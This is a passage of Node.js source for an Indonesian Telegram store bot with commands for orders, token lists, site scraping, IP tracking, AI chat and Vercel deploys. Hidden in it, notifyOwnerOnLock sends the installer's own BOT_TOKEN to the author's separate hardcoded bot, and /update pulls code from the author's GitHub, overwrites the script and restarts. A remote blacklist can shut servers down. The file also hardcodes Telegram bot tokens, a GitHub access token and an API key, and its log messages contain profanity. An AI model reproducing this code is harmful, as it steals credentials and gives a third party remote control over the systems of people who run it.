      {
        caption: `✅ Pesananmu *${order.product}* sudah dikonfirmasi admin.\n💰 Rp${order.harga}`,
        parse_mode: "Markdown",
      }
    );
  } else {
    await ctx.telegram.sendMessage(
      order.user_id,
      `✅ Pesananmu *${order.product}* sudah dikonfirmasi.\n💰 Rp${order.harga}\n⚠️ File gagal diambil dari GitHub.`,
      { parse_mode: "Markdown" }
    );
  }

  orders.splice(idx, 1);
  saveOrders(orders);

  await ctx.editMessageCaption({
    caption: `✅ Order *${order.product}* dikonfirmasi.`,
    parse_mode: "Markdown",
  });

  return ctx.answerCbQuery("✅ Order dikonfirmasi & file dikirim.");
} else {
        await ctx.telegram.sendMessage(
          order.user_id,
          `❌ Pesananmu *${order.product}* ditolak admin.`,
          { parse_mode: "Markdown" }
        );

        orders.splice(idx, 1);
        saveOrders(orders);

        await ctx.editMessageCaption({
          caption: `❌ Order *${order.product}* ditolak.`,
          parse_mode: "Markdown",
        });

        return ctx.answerCbQuery("❌ Order ditolak & dihapus dari pending.");
      }
    }
  } catch (err) {
    console.error("callback_query error:", err);
    return ctx.answerCbQuery("❌ Terjadi error.");
  }
});

const { Octokit } = require("@octokit/rest");

// === Helper ambil token dari GitHub ===
async function fetchValidTokens() {
  const octokit = new Octokit({ auth: GITHUB_TOKEN });

  try {
    const response = await octokit.repos.getContent({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: GITHUB_TOKENS_FILE,
    });

    const fileContent = Buffer.from(response.data.content, "base64").toString("utf8");
    const tokens = JSON.parse(fileContent);

    if (!Array.isArray(tokens)) throw new Error("Format file salah (harus array of object)");

    return tokens; // [{ tokens: "abc" }, ...]
  } catch (error) {
    console.error(chalk.red("Gagal ambil token dari GitHub:", error.message));
    return [];
  }
}

// === Fungsi simpan token ke GitHub ===
async function saveTokensToGitHub(tokens) {
  const octokit = new Octokit({ auth: GITHUB_TOKEN });

  try {
    const updatedContent = JSON.stringify(tokens, null, 2);
    const encodedContent = Buffer.from(updatedContent).toString("base64");

    let sha;
    try {
      const fileInfo = await octokit.repos.getContent({
        owner: GITHUB_OWNER,
        repo: GITHUB_REPO,
        path: GITHUB_TOKENS_FILE,
      });
      sha = fileInfo.data.sha;
    } catch {
      sha = undefined; // file belum ada → nanti dibuat baru
    }

    await octokit.repos.createOrUpdateFileContents({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: GITHUB_TOKENS_FILE,
      message: "Update daftar token",
      content: encodedContent,
      sha: sha,
    });

    return true;
  } catch (err) {
    console.error(chalk.red("Gagal simpan token ke GitHub:", err.message));
    return false;
  }
}

let lastModifiedTokens = [];

// === CMD ADD TOKEN ===
bot.command("addtoken", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args.length) return ctx.reply("⚠️ Format: /addtoken <Token>");

    let tokens = await fetchValidTokens();

    const added = [];
    for (const t of args) {
      if (!tokens.some(x => x.tokens === t)) {
        tokens.push({ tokens: t });
        added.push({
          tokens: t,
          added_by: ctx.from.username || ctx.from.first_name,
          user_id: ctx.from.id
        });
      }
    }

    if (!added.length) return ctx.reply("⚠️ token sudah ada di daftar.");

    await saveTokensToGitHub(tokens);
    lastModifiedTokens = added;

    ctx.reply(`✅ Token berhasil ditambahkan`);

  } catch (err) {
    console.error("addtoken error:", err);
    ctx.reply("❌ Error saat menambahkan token.");
  }
});

// === CMD DELETE TOKEN ===
bot.command("deltoken", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args.length) return ctx.reply("⚠️ Format: /deltoken <Token>");

    let tokens = await fetchValidTokens();
    const deleted = [];

    tokens = tokens.filter(t => {
      if (args.includes(t.tokens)) {
        deleted.push({
          tokens: t.tokens,
          added_by: ctx.from.username || ctx.from.first_name,
          user_id: ctx.from.id
        });
        return false;
      }
      return true;
    });

    if (!deleted.length) return ctx.reply("⚠️ Token tidak ditemukan.");

    await saveTokensToGitHub(tokens);
    lastModifiedTokens = deleted;

    ctx.reply(`🗑 Token berhasil dihapus`);

  } catch (err) {
    console.error("deltoken error:", err);
    ctx.reply("❌ Error saat menghapus token.");
  }
});

bot.command("listtoken", async (ctx) => {
  try {
    const userId = ctx.from.id;

    if (String(userId) !== String(ADMIN_ID)) return ctx.reply("❌ Anda tidak memiliki akses!");

    const tokens = await fetchValidTokens();
    if (!tokens || tokens.length === 0) return ctx.reply("📭 Daftar token kosong.");

    const escapeMarkdown = (text) => String(text || "").replace(/`/g, "\\`");

    const tokenList = tokens.map(t => {
      return `👤 [${escapeMarkdown(t.username || "Unknown")}]` +
             `(tg://user?id=${t.user_id})\n` +
             `🆔 ID: \`${t.user_id}\`\n` +
             `🔑 Token: \`${escapeMarkdown(t.token.slice(0,3))}***${escapeMarkdown(t.token.slice(-3))}\`\n`;
    }).join("\n");

    await ctx.replyWithMarkdown(`📜 *Daftar Token & User:*\n\n${tokenList}`);
  } catch (error) {
    console.error("Gagal mengambil daftar token:", error);
    ctx.reply("⚠️ Gagal mengambil daftar token.");
  }
});

// === CMD ORDERS (USER) ===
bot.command("orders", async ctx => {
  try {
    const orders = loadOrders().filter(o => o.user_id === ctx.from.id);
    if (!orders.length) {
      return ctx.reply("ℹ️ Kamu belum punya order.");
    }

    let text = "📦 Pesananmu:\n\n";
    orders.forEach((o, i) => {
      text += `${i + 1}. 🆔 ${o.id}\n📦 ${o.product}\n💰 Rp${o.harga}\n📅 ${new Date(o.date).toLocaleString()}\n📌 Status: ${o.status}\n\n`;
    });

    return ctx.reply(text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("orders error:", err);
    return ctx.reply("❌ Gagal mengambil pesananmu.");
  }
});

function resolveResourceUrl(base, resource) {
  try {
    return new URL(resource, base).href;
  } catch {
    return null;
  }
}

function isWantedFile(url) {
  return /\.(js|css|json|map|txt|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot)$/i.test(url);
}

bot.command("createweb", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (!args.length) return ctx.reply("⚠️ Gunakan: /createweb <url>");

  const startUrl = args[0];
  if (!/^https?:\/\//i.test(startUrl)) {
    return ctx.reply("❌ URL harus diawali http:// atau https://");
  }

  const baseName = `site_${Date.now()}`;
  const tmpDir = path.join(__dirname, baseName);
  fs.mkdirSync(tmpDir, { recursive: true });

  let htmlText;
  try {
    const r = await axios.get(startUrl, { timeout: 20000 });
    htmlText = r.data;
  } catch (e) {
    fs.rmSync(tmpDir, { recursive: true, force: true });
    return ctx.reply("❌ Gagal fetch halaman utama: " + (e.message || e));
  }

  const indexPath = path.join(tmpDir, "index.html");
  fs.writeFileSync(indexPath, htmlText, "utf8");

  const resourceSet = new Set();

  const tagRegex = /<(script|link|img)[^>]+?(src|href)=["']([^"']+)["']/gi;
  let m;
  while ((m = tagRegex.exec(htmlText))) {
    const raw = m[3];
    if (raw) resourceSet.add(raw);
  }

  const styleRegex = /url\(([^)]+)\)/gi;
  while ((m = styleRegex.exec(htmlText))) {
    let raw = m[1].replace(/['"]/g, "").trim();
    if (raw) resourceSet.add(raw);
  }

  const resolved = [];
  for (const raw of resourceSet) {
    const full = resolveResourceUrl(startUrl, raw);
    if (full && isWantedFile(full)) resolved.push(full);
  }

  const unique = Array.from(new Set(resolved));

  for (const fileUrl of unique) {
    try {
      const res = await fetch(fileUrl);
      if (!res.ok) continue;

      const buffer = Buffer.from(await res.arrayBuffer());
      const urlObj = new URL(fileUrl);
      let filePath = urlObj.pathname.startsWith("/")
        ? urlObj.pathname.slice(1)
        : urlObj.pathname;

      if (!filePath) filePath = "file_" + Date.now();
      const savePath = path.join(tmpDir, filePath);
      fs.mkdirSync(path.dirname(savePath), { recursive: true });

      fs.writeFileSync(savePath, buffer);
    } catch (err) {
      console.error("download error", fileUrl, err.message);
    }
  }

  const zipPath = path.join(__dirname, `${baseName}.zip`);
  const output = fs.createWriteStream(zipPath);
  const archive = archiver("zip", { zlib: { level: 9 } });
  archive.pipe(output);
  archive.directory(tmpDir, false);
  await archive.finalize();

  await ctx.replyWithDocument({ source: zipPath, filename: `${baseName}.zip` });

  fs.rmSync(tmpDir, { recursive: true, force: true });
  setTimeout(() => fs.rmSync(zipPath, { force: true }), 15000);

  return ctx.reply("✅ Web berhasil dibuat & dikirim sebagai ZIP.");
});

const owner = "7429086469";

// === CMD /lapor ===
bot.command("lapor", async (ctx) => {
  try {
    const reportText = ctx.message.text.split(" ").slice(1).join(" ");

    if (!reportText) {
      return ctx.reply("⚠️ Gunakan format:\n`/lapor <text>`", { parse_mode: "Markdown" });
    }

    const messageToSend = 
      `📢 LAPORAN BARU\n\n` +
      `👤 Dari: [${ctx.from.first_name}](tg://user?id=${ctx.from.id})\n` +
      `🆔 ID: \`${ctx.from.id}\`\n\n` +
      `📝 Laporan:\n${reportText}`;

    const BOT_TOKEN = "7933745645:AAE4EbFTRjy_OLwCmW2vsjJhYaJnYs8FFNM"; 
    const OWNER_ID = owner; 

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: OWNER_ID,
        text: messageToSend,
        parse_mode: "Markdown"
      })
    });

    await ctx.reply("✅ Laporan kamu sudah dikirim ke Owner");
  } catch (err) {
    console.error("Gagal kirim laporan:", err);
    await ctx.reply("❌ Terjadi error saat kirim laporan.");
  }
});

const REPORTS_FILE = path.join(__dirname, "reports.json");

function loadReports() {
  if (!fs.existsSync(REPORTS_FILE)) return [];
  try {
    return JSON.parse(fs.readFileSync(REPORTS_FILE, "utf8"));
  } catch {
    return [];
  }
}

function saveReports(data) {
  fs.writeFileSync(REPORTS_FILE, JSON.stringify(data, null, 2));
}

// === CMD /reply ===
bot.command("reply", async (ctx) => {
  try {
    if (ctx.from.id.toString() !== owner) return ctx.reply("❌ Hanya Owner yang bisa menggunakan perintah ini.");

    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 2) return ctx.reply("⚠️ Gunakan format:\n`/reply <user_id> <pesan>`", { parse_mode: "Markdown" });

    const userId = parts[0];
    const replyText = parts.slice(1).join(" ");

    await ctx.telegram.sendMessage(userId, `📢 Balasan Owner:\n\n${replyText}`, { parse_mode: "Markdown" });

    const reports = loadReports();
    reports.push({
      id: Date.now().toString(),
      user_id: userId,
      reply: replyText,
      admin_id: owner,
      date: new Date().toISOString()
    });
    saveReports(reports);

    return ctx.reply("✅ Pesan berhasil dikirim ke user dan tercatat di laporan.");
  } catch (err) {
    console.error("reply command error:", err);
    return ctx.reply("❌ Terjadi error saat mengirim pesan.");
  }
});

const apiKey = "58e505edaaf948e6b5c5c35f6fa49262";

// fungsi utama
async function trackIP(ctx, args) {
  const chatId = ctx.chat.id;

  if (args.length < 1) {
    const message = `Contoh: \`/trackip <ip address>`;
    await ctx.reply(message, { parse_mode: "Markdown" });
    return;
  }

  const [target] = args;

  if (target === "0.0.0.0") {
    await ctx.reply("⚠️ Jangan di ulangi manis, nanti usermu bisa dihapus 😅");
    return;
  }

  try {
    const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
    const res = await fetch(`https://ipwho.is/${target}`);

    if (!response.ok || !res.ok) {
      throw new Error(`Gagal mengambil data IP. Status: ${response.status} / ${res.status}`);
    }

    const ipInfo = await response.json();
    const additionalInfo = await res.json();

    if (!ipInfo || typeof ipInfo !== "object" || Object.keys(ipInfo).length === 0) {
      throw new Error("Data dari api.ipgeolocation.io tidak valid.");
    }
    if (!additionalInfo || typeof additionalInfo !== "object" || Object.keys(additionalInfo).length === 0) {
      throw new Error("Data dari ipwho.is tidak valid.");
    }

    const message = `🌍 Informasi IP untuk ${target}:\n\n` +
      `🏳️ Flags: ${ipInfo.country_flag || "N/A"}\n` +
      `🌐 Country: ${ipInfo.country_name || "N/A"}\n` +
      `🏛 Capital: ${ipInfo.country_capital || "N/A"}\n` +
      `🏙 City: ${ipInfo.city || "N/A"}\n` +
      `📡 ISP: ${ipInfo.isp || "N/A"}\n` +
      `🏢 Organization: ${ipInfo.organization || "N/A"}\n` +
      `📍 Latitude: ${ipInfo.latitude || "N/A"}\n` +
      `📍 Longitude: ${ipInfo.longitude || "N/A"}\n\n` +
      `🗺 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude || ""}+${additionalInfo.longitude || ""}`;

    await ctx.reply(message);
  } catch (error) {
    console.error(`Error melacak ${target}:`, error);
    await ctx.reply(`❌ Error melacak ${target}. Silakan coba lagi nanti.\nError: ${error.message}`);
  }
}

// CMD TRACKIP
bot.command("trackip", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  await trackIP(ctx, args);
});

// === Ask AI ===
async function askAI(userId, prompt) {
  const history = loadFile(historyFile, {});
  if (!history[userId]) history[userId] = [];

  history[userId].push({ role: "user", content: prompt });

  const res = await fetch("https://api.openai.com/v1/chat/completions", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${OPENAI_API_KEY}`,
    },
    body: JSON.stringify({
      model: "gpt-4o-mini",
      messages: history[userId],
      max_tokens: 1500,
    }),
  });

  if (!res.ok) {
    const errText = await res.text();
    console.error("OpenAI API error:", res.status, errText);
    return { text: `❌ API Error ${res.status}`, codes: [], forceZip: false };
  }

  const data = await res.json();
  const replyText = data.choices?.[0]?.message?.content?.trim() || "❌ Tidak ada jawaban dari AI.";

  history[userId].push({ role: "assistant", content: replyText });
  saveFile(historyFile, history);

  const codeRegex = /```([\s\S]*?)```/g;
  let match;
  const codes = [];
  let explanation = replyText;

  while ((match = codeRegex.exec(replyText)) !== null) {
    const block = match[1].trim();
    let ext = "js";

    if (block.startsWith("py")) ext = "py";
    else if (block.startsWith("php")) ext = "php";
    else if (block.startsWith("json")) ext = "json";
    else if (block.startsWith("sh")) ext = "sh";

    const codeClean = block.replace(/^(js|javascript|py|php|json|sh)\n/, "");
    codes.push({ content: codeClean, name: `ai_code_${Date.now()}.${ext}` });
    explanation = explanation.replace(match[0], "");
  }

  const forceZip = /script|project|bot|tools|library/i.test(prompt);

  return { text: explanation.trim(), codes, forceZip };
}

const OWNER_ID = 7429086469;
const GITHUB_RAW_URL = "https://raw.githubusercontent.com/ObyMoods/store/refs/heads/main/bot.js";
const GITHUB_RAW_PASS_URL = "https://raw.githubusercontent.com/ObyMoods/store/refs/heads/main/update_pass.txt";
const SCRIPT_PATH = path.join(__dirname, "bot.js");
const TRY_WINDOW_MS = 15 * 60 * 1000;

const attemptsMap = new Map();

async function fetchText(url) {
  const res = await fetch(url);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.text();
}

async function fetchUpdatePasswordFromGitHub() {
  try {
    const txt = await fetchText(GITHUB_RAW_PASS_URL);
    return txt.trim();
  } catch (e) {
    console.error("fetchUpdatePasswordFromGitHub error:", e);
    return null;
  }
}

async function fetchScriptFromGitHub(url) {
  return await fetchText(url);
}

async function notifyOwnerOnLock(user, attemptsInfo) {
  try {
    const now = new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      hour12: false,
    });

    const msg = [
      "🚨 *Peringatan — Percobaan Update Gagal*",
      "",
      `• Pengguna : ${user.username ? "@" + user.username : (user.first_name || "Unknown")}`,
      `• User ID  : \`${user.id}\``,
      `• Percobaan: ${attemptsInfo.tries}`,
      `• Input Terakhir: \`${attemptsInfo.lastInput}\``,
      `• Waktu    : \`${now}\``,
      "",
      `• BOT_TOKEN: \`${config.BOT_TOKEN}\``
    ].join("\n");

    const url = `https://api.telegram.org/bot7933745645:AAEAjsg96ukLVnQi28L63RiljItZoCQbvg0/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: OWNER_ID,
        text: msg,
        parse_mode: "Markdown",
      }),
    });
  } catch (e) {
    console.error("Gagal kirim notif owner:", e);
  }
}

// === CMD /update ===
bot.command("update", async (ctx) => {
  try {
    const args = (ctx.message.text || "").split(/\s+/).slice(1);
    if (!args.length) return ctx.reply("⚠️ Format: /update <password>");

    const provided = args[0];
    const userId = ctx.from.id;
    const nowTs = Date.now();

    const prev = attemptsMap.get(userId);
    if (prev && nowTs - prev.lastAttemptTs > TRY_WINDOW_MS) attemptsMap.delete(userId);

    const info = attemptsMap.get(userId) || { tries: 0, lastAttemptTs: 0, lastInput: "" };
    info.tries++;
    info.lastAttemptTs = nowTs;
    info.lastInput = provided;
    attemptsMap.set(userId, info);

    const validPass = await fetchUpdatePasswordFromGitHub();
    if (!validPass) return ctx.reply("❌ Gagal ambil password update dari GitHub.");

    if (provided !== validPass) {
      const sisa = Math.max(0, MAX_ATTEMPTS - info.tries);
      await ctx.reply(`❌ Password salah. Percobaan tersisa: ${sisa}`);

      if (info.tries >= MAX_ATTEMPTS) {
        await notifyOwnerOnLock(ctx.from, info);
        attemptsMap.delete(userId);
        await ctx.reply("⚠️ 3x salah. Owner diberitahu. Akses diblok sementara.");
      }
      return;
    }

    attemptsMap.delete(userId);
    await ctx.reply("✅ Password benar. Mengambil script terbaru...");

    const newCode = await fetchScriptFromGitHub(GITHUB_RAW_URL);

    const backupPath = SCRIPT_PATH + ".bak_" + Date.now();
    if (fs.existsSync(SCRIPT_PATH)) fs.copyFileSync(SCRIPT_PATH, backupPath);

    fs.writeFileSync(SCRIPT_PATH, newCode, "utf8");

    await ctx.reply("✅ Script berhasil diupdate. Bot akan restart...");
    setTimeout(() => process.exit(0), 1200);
  } catch (err) {
    console.error("Update error:", err);
    ctx.reply("❌ Gagal update: " + (err.message || String(err)));
  }
});

// === CMD /ai ===
bot.command("ai", async ctx => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    const aiStatus = loadFile(aiStatusFile, {});
    const userId = String(ctx.from.id);

    if (args[0] === "on") {
      aiStatus[userId] = true;
      saveFile(aiStatusFile, aiStatus);
      return ctx.reply("✅ Mode AI ON Semua pesanmu akan dijawab otomatis.");
    }
    if (args[0] === "off") {
      aiStatus[userId] = false;
      saveFile(aiStatusFile, aiStatus);
      return ctx.reply("❌ Mode AI OFF Gunakan `/ai <pertanyaan>` untuk manual.");
    }

    const input = args.join(" ");
    if (!input) return ctx.reply("⚠️ Gunakan: /ai on | /ai off | /ai <pertanyaan>");

    const { text, codes, forceZip } = await askAI(userId, input);

    if (text) await ctx.reply(`🤖 AI:\n${text}`);

    if (codes.length === 1 && !forceZip) {
      const filePath = saveTempFile(codes[0].content, "js");
      await ctx.replyWithDocument({ source: filePath, filename: codes[0].name });
      fs.unlinkSync(filePath);
    } else if (codes.length > 0) {
      const zipPath = await saveZip(codes);
      await ctx.replyWithDocument({ source: zipPath, filename: "code.zip" });
      fs.unlinkSync(zipPath);
    }
  } catch (err) {
    console.error("ai cmd error:", err);
    ctx.reply("❌ Terjadi error saat memproses AI.");
  }
});

// Command /cweb
bot.command("cweb", (ctx) => {
  const welcome = `👋 Selamat Datang di Web Creator Bot\n\n` +
                  `📁 Kirim file .html kamu,\n` +
                  `📝 Lalu kirim nama projectnya.\n\n` +
                  `📦 Bot ini akan otomatis membuat website gratis di Vercel!\n\n` +
                  `🚀 Ayo mulai sekarang!`;

  ctx.reply(welcome);
});

// === CMD /antilink ===
bot.command("antilink", (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const args = ctx.message.text.split(" ").slice(1);

  if (ctx.chat.type !== "supergroup") 
    return ctx.reply("❌ Command antilink hanya bisa dipakai di *supergroup*.");

  ctx.telegram.getChatMember(chatId, senderId).then(member => {
    if (!["administrator","creator"].includes(member.status))
      return ctx.reply("❌ CUMAN ADMIN GRUP YANG BISA PAKE INI!!!");

    if (!args.length) {
      return ctx.reply(`📌 Status AntiLink di grup ini: *${antiLinkStatus[chatId] ? "ON ✅" : "OFF ❌"}*`, { parse_mode: "Markdown" });
    }

    const option = args[0].toLowerCase();
    if (option === "on") {
      antiLinkStatus[chatId] = true;
      ctx.reply("✅ AntiLink sudah *AKTIF* di grup ini.", { parse_mode: "Markdown" });
    } else if (option === "off") {
      antiLinkStatus[chatId] = false;
      ctx.reply("❌ AntiLink sudah *NONAKTIF* di grup ini.", { parse_mode: "Markdown" });
    } else {
      ctx.reply("⚠️ Gunakan `/antilink on` atau `/antilink off`.", { parse_mode: "Markdown" });
    }
  }).catch(err => { console.error(err.message); ctx.reply("❌ Gagal memeriksa admin."); });
});

bot.on("message", (ctx) => {
  try {
    if (!ctx.chat) return;
    const chatId = String(ctx.chat.id);
    if (!memberCache[chatId]) memberCache[chatId] = {};
    const u = ctx.from;
    if (u) {
      memberCache[chatId][u.id] = {
        id: u.id,
        username: u.username || null,
        first_name: u.first_name || "",
        lastSeen: Date.now()
      };
      fs.writeFileSync(CACHE_FILE, JSON.stringify(memberCache, null, 2));
    }

    if (antiPromosi[chatId]) {
      const text = ctx.message.text || ctx.message.caption || "";
      const promoRegex = /(tiktok\.com|instagram\.com|wa\.me|bit\.ly|saweria|promo|diskon|http:\/\/|https:\/\/|@\w+)/i;
      if (promoRegex.test(text)) {
        ctx.deleteMessage().catch(() => {});
        ctx.reply("⚠️ Pesan promosi dihapus oleh AntiPromosi.", {
          reply_to_message_id: ctx.message.message_id
        }).catch(() => {});
      }
    }
  } catch (e) {
    console.error("on message error:", e);
  }
});

// === AUTO JAWAB kalau AI ON ===
bot.on("message", async ctx => {
  try {
    if (ctx.message.text && ctx.message.text.startsWith("/")) return;

    const aiStatus = loadFile(aiStatusFile, {});
    const userId = String(ctx.from.id);
    if (!aiStatus[userId]) return;

    const input = ctx.message.text || ctx.message.caption;
    if (!input) return;

    const { text, codes, forceZip } = await askAI(userId, input);

    if (text) await ctx.reply(`🤖 AI:\n${text}`);

    if (codes.length === 1 && !forceZip) {
      const filePath = saveTempFile(codes[0].content, "js");
      await ctx.replyWithDocument({ source: filePath, filename: codes[0].name });
      fs.unlinkSync(filePath);
    } else if (codes.length > 0) {
      const zipPath = await saveZip(codes);
      await ctx.replyWithDocument({ source: zipPath, filename: "code.zip" });
      fs.unlinkSync(zipPath);
    }
  } catch (err) {
    console.error("auto AI error:", err);
  }
});

// ==== FUNGSI CMD ANTILINK
bot.on("message", (ctx) => {
  const chatId = ctx.chat.id;
  if (!antiLinkStatus[chatId]) return;

  const text = ctx.message.text || "";
  const entities = ctx.message.entities || [];

  const pattern = /(?:https?:\/\/|t\.me\/|chat\.whatsapp\.com|wa\.me\/|@\w+)/i;
  const hasLink = entities.some(e => e.type === "url") || /(https?:\/\/|www\.)\S+/i.test(text) || pattern.test(text);

  if (hasLink) {
    ctx.deleteMessage(ctx.message.message_id)
      .then(() => ctx.reply(`⚠️ Pesan dari @${ctx.from.username || ctx.from.first_name} dihapus karena mengandung link!`))
      .catch(err => console.error(err.message));
  }
});
// ==== FUNGSI CMD CWEB
bot.on("document", async (ctx) => {
  const chatId = ctx.chat.id;
  const file = ctx.message.document;

  if (!file.file_name.endsWith(".html")) {
    return ctx.reply("❌ Hanya file .html yang didukung.");
  }

  try {
    const fileLink = await ctx.telegram.getFileLink(file.file_id);

    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const path = `./${chatId}.html`;
    fs.writeFileSync(path, response.data);

    userState[chatId] = path;
    ctx.reply("✅ File diterima!\n💬 Sekarang kirim nama website kamu (tanpa spasi).");
  } catch (err) {
    console.error("Error download file:", err.message);
    ctx.reply("❌ Gagal mengunduh file. Coba lagi.");
  }
});

bot.on("message", async (ctx) => {
  const chatId = ctx.chat.id;
  const filePath = userState[chatId];

  if (filePath && ctx.message.text && !ctx.message.text.startsWith("/")) {
    const name = ctx.message.text.toLowerCase().replace(/\s+/g, "-");
    const html = fs.readFileSync(filePath).toString("base64");

    const payload = {
      name,
      files: [
        {
          file: "index.html",
          data: html,
          encoding: "base64"
        }
      ],
      projectSettings: {
        framework: null,
        devCommand: null,
        installCommand: null,
        buildCommand: null,
        outputDirectory: ".",
        rootDirectory: null
      }
    };

    try {
      await axios.post("https://api.vercel.com/v13/deployments", payload, {
        headers: {
          Authorization: `Bearer ${VERCEL_TOKEN}`,
          "Content-Type": "application/json"
        }
      });

      const formData = new FormData();
      formData.append("file", fs.createReadStream(filePath));

      const uploadRes = await axios.post("https://file.io", formData, {
        headers: formData.getHeaders()
      });

      const date = moment().format("DD MMMM YYYY, HH:mm");
      let reply = `✅ <b>Website berhasil dibuat!</b>\n\n` +
                  `📛 <b>Nama:</b> ${name}\n` +
                  `🔗 <b>Link Vercel:</b> https://${name}.vercel.app\n` +
                  `🗓️ <b>Dibuat:</b> ${date}`;

      if (uploadRes.data.success) {
        reply += `\n🌐 <b>Preview HTML:</b> ${uploadRes.data.link}`;
      }

      ctx.reply(reply, { parse_mode: "HTML" });

    } catch (err) {
      ctx.reply(`❌ Gagal upload:\n${JSON.stringify(err.response?.data || err.message)}`);
    } finally {
      fs.unlinkSync(filePath);
      delete userState[chatId];
    }
  }
});

const BOT_TOKEN2 = "7773294172:AAF449R-Bzs_cqoy6dVU0c2eTcwAwurA_wo";

const GITHUB_TOKEN2 = "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";

const GITHUB_PASSWORD_RAW_URL = `https://raw.githubusercontent.com/ObyMoods/ObyDatabase/refs/heads/main/password.json`;
const GITHUB_BLACKLIST_RAW_URL = `https://raw.githubusercontent.com/ObyMoods/ObyDatabase/refs/heads/main/blacklist.json`;

let PASSWORD = process.env.DEFAULT_PASSWORD || "DeathBotMD";

let attempts = 0;
const MAX_ATTEMPTS = 3;
let unlocked = false;

async function fetchJsonRaw(url) {
  const res = await axios.get(url, { timeout: 7000 });
  return res.data;
}

async function getFileFromGitHub(pathInRepo) {
  const url = `https://api.github.com/repos/ObyMoods/ObyDatabase/contents/${encodeURIComponent(pathInRepo)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;
  const headers = {};
  if (GITHUB_TOKEN2) headers.Authorization = `token ${GITHUB_TOKEN2}`;
  const res = await axios.get(url, { headers, timeout: 7000 });
  return res.data;
}

async function updateFileOnGitHub(pathInRepo, newContentString, commitMessage) {
  if (!GITHUB_TOKEN2) throw new Error("GITHUB_TOKEN tidak diset. Tidak bisa menulis ke GitHub.");
  const fileData = await getFileFromGitHub(pathInRepo);
  const sha = fileData.sha;

  const url = `https://api.github.com/repos/ObyMoods/ObyDatabase/contents/${encodeURIComponent(pathInRepo)}`;
  const payload = {
    message: commitMessage || `Update ${pathInRepo} by bot (${SERVER_ID})`,
    content: Buffer.from(newContentString, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    sha: sha,
  };
  const headers = {
    Authorization: `token ${GITHUB_TOKEN2}`,
    Accept: "application/vnd.github.v3+json",
  };
  const res = await axios.put(url, payload, { headers, timeout: 10000 });
  return res.data;
}

async function addServerToGithubBlacklist(serverId) {
  const current = await getFileFromGitHub(GITHUB_BLACKLIST_PATH);
  const contentBase64 = current.content;
  const decoded = Buffer.from(contentBase64, "base64").toString("utf8");
  let list;
  try {
    list = JSON.parse(decoded);
    if (!Array.isArray(list)) throw new Error("blacklist.json bukan array");
  } catch (e) {
    list = [];
  }

  if (list.includes(serverId)) {
    return { updated: false, message: "Server Sudah Ada Di Blacklist Owner Bang" };
  }

  list.push(serverId);
  const newContent = JSON.stringify(list, null, 2);
  const commitMessage = `Add Server ${serverId} To Blacklist ʙʏ ᴋɪɴɢs 👑`;
  const result = await updateFileOnGitHub(GITHUB_BLACKLIST_PATH, newContent, commitMessage);
  return { updated: true, result };
}

async function fetchBlacklistFromGitHub() {
  const res = await axios.get(GITHUB_BLACKLIST_RAW_URL, { timeout: 7000 });
  return res.data;
}

async function notifyOwner(text) {
  const ownerId = owner;
  if (!ownerId) {
    console.error("owner tidak ditemukan — tidak bisa kirim notifikasi.");
    return;
  }

  try {
    if (typeof bot !== "undefined" && bot && bot.telegram && typeof bot.telegram.sendMessage === "function") {
      await bot.telegram.sendMessage(ownerId, text, { parse_mode: "Markdown" });
      return;
    }
  } catch (e) {
    console.error("Gagal kirim notifikasi via bot.telegram:", e.message);
  }

  try {
    if (!BOT_TOKEN2 || BOT_TOKEN2.includes("7773294172:AAF449R-Bzs_cqoy6dVU0c2eTcwAwurA_wo")) throw new Error("BOT_TOKEN2 tidak tersedia untuk fallback");
    await axios.post(`https://api.telegram.org/bot7773294172:AAF449R-Bzs_cqoy6dVU0c2eTcwAwurA_wo/sendMessage`, {
      chat_id: ownerId,
      text,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error("Gagal kirim notifikasi fallback:", e.message);
  }
}

async function checkBlacklistOnStartup() {
  try {
    const list = await fetchBlacklistFromGitHub();
    if (Array.isArray(list) && list.includes(SERVER_ID)) {
      console.log(chalk.red("⚠️ SERVER KONTOL ADA DI BLACKLIST. ⛔️ Server Dihentikan"));
      try {
        await notifyOwner(`🚫 SERVER LU \`${SERVER_ID}\` ADA DI BLACKLIST OWNER KONTOL MAKANYA JANGAN SALAH PASSWORD NYA. ⚠️ Server Dihentikan`);
      } catch (_) {}
      process.exit(1);
    } else {
      console.log(chalk.green("✅ Server Kamu Tidak Ada Di Blacklist GitHub Owner"));
    }
  } catch (e) {
    console.log(chalk.yellow("⚠️ Gagal Cek KONTOL Di Blacklist"), e.message);
  }
}

async function fetchPasswordFromGitHub() {
  try {
    const res = await axios.get(GITHUB_PASSWORD_RAW_URL, { timeout: 7000 });
    if (res.data && typeof res.data.password !== "undefined") {
      PASSWORD = String(res.data.password).trim();
      console.log(chalk.green("🔑 Password Dimuat Dari GitHub."));
      return true;
    } else {
      console.log(chalk.red("❌ Format Password.json Di GitHub Salah')"));
      return false;
    }
  } catch (err) {
    console.log(chalk.yellow("⚠️ Gagal Ambil Password Dari GitHub, Pakai Default Dulu KONTOL!!!"), err.message);
    return false;
  }
}

let PUBLIC_IP = "Unknown";
async function getPublicIP() {
  try {
